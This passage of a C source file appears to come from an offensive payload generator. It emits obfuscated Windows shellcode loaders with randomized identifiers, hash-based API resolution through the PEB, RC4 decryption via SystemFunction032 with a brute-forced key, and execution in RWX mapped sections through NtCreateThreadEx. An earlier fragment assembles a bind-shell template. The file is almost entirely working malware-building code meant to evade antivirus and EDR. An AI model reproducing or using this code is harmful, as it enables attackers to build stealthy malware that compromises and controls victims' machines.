        accept_typedef, paccept_name,
        NtWait_typedef, pNtWait_name,
        NtClose_typedef, pNtClose_name,
        random_zero_func,
        random_bind_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        pbind_name,
        pclosesocket_name,
        pWSACleanup_name,
        plisten_name,
        pclosesocket_name,
        pWSACleanup_name,
        paccept_name,
        pclosesocket_name,
        pWSACleanup_name,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pbind_name, bind_typedef, random_getproc_name, bind_hash_name,
        plisten_name, listen_typedef, random_getproc_name, listen_hash_name,
        paccept_name, accept_typedef, random_getproc_name, accept_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_func_name,
        random_init_func,
        random_bind_func,
        random_func_name
    );
}



void obf_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtCreateSection_name[9], pNtMapViewOfSection_name[9], pUnmapViewOfSection_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtCreateSection_name, sizeof(pNtCreateSection_name));
    generate_random_string(pNtMapViewOfSection_name, sizeof(pNtMapViewOfSection_name));
    generate_random_string(pUnmapViewOfSection_name, sizeof(pUnmapViewOfSection_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntcreatesection_hash_name[11];
    char ntmapviewofsection_hash_name[12], ntunmapviewofsection_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntcreatesection_hash_name, sizeof(ntcreatesection_hash_name));
    generate_random_string(ntmapviewofsection_hash_name, sizeof(ntmapviewofsection_hash_name));
    generate_random_string(ntunmapviewofsection_hash_name, sizeof(ntunmapviewofsection_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtCreateSection_typedef[12], NtMapViewOfSection_typedef[12], UnmapViewOfSection_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtCreateSection_typedef, sizeof(NtCreateSection_typedef));
    generate_random_string(NtMapViewOfSection_typedef, sizeof(NtMapViewOfSection_typedef));
    generate_random_string(UnmapViewOfSection_typedef, sizeof(UnmapViewOfSection_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x468A2FDD\n"
        "#define %s           0xC0261277\n"
        "#define %s           0x129AF9DA\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pfu[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL uard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char vdf[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pfu, sizeof(pfu), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(vdf), pfu);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL %s() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(%s) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntd = %s(%s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    p%s(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    p%s(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, %s, sizeof(%s));\n"
        "    uard(HINT_BYTE, %s, address, sizeof(%s), sizeof(%s));\n"
        "    p%s(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    p%s(thandle, FALSE, &timeout);\n"
        "    p%s(thandle);\n"
        "    p%s((HANDLE)-1, address);\n"
        "    p%s(shandle);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtCreateSection_typedef,
        NtMapViewOfSection_typedef,
        UnmapViewOfSection_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntcreatesection_hash_name,
        ntmapviewofsection_hash_name,
        ntunmapviewofsection_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_payload_name, shellcodeArray, random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtCreateSection_typedef, pNtCreateSection_name, NtCreateSection_typedef, random_getproc_name, ntcreatesection_hash_name,
        NtMapViewOfSection_typedef, pNtMapViewOfSection_name, NtMapViewOfSection_typedef, random_getproc_name, ntmapviewofsection_hash_name,
        UnmapViewOfSection_typedef, pUnmapViewOfSection_name, UnmapViewOfSection_typedef, random_getproc_name, ntunmapviewofsection_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtCreateSection_name,
        pNtMapViewOfSection_name,
        random_payload_name, random_payload_name,
        random_key_name, random_key_name, random_payload_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        pUnmapViewOfSection_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_inject_func
    );
}
void obf_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtCreateSection_name[9], pNtMapViewOfSection_name[9], pUnmapViewOfSection_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtCreateSection_name, sizeof(pNtCreateSection_name));
    generate_random_string(pNtMapViewOfSection_name, sizeof(pNtMapViewOfSection_name));
    generate_random_string(pUnmapViewOfSection_name, sizeof(pUnmapViewOfSection_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntcreatesection_hash_name[11];
    char ntmapviewofsection_hash_name[12], ntunmapviewofsection_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntcreatesection_hash_name, sizeof(ntcreatesection_hash_name));
    generate_random_string(ntmapviewofsection_hash_name, sizeof(ntmapviewofsection_hash_name));
    generate_random_string(ntunmapviewofsection_hash_name, sizeof(ntunmapviewofsection_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtCreateSection_typedef[12], NtMapViewOfSection_typedef[12], UnmapViewOfSection_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtCreateSection_typedef, sizeof(NtCreateSection_typedef));
    generate_random_string(NtMapViewOfSection_typedef, sizeof(NtMapViewOfSection_typedef));
    generate_random_string(UnmapViewOfSection_typedef, sizeof(UnmapViewOfSection_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x468A2FDD\n"
        "#define %s           0xC0261277\n"
        "#define %s           0x129AF9DA\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
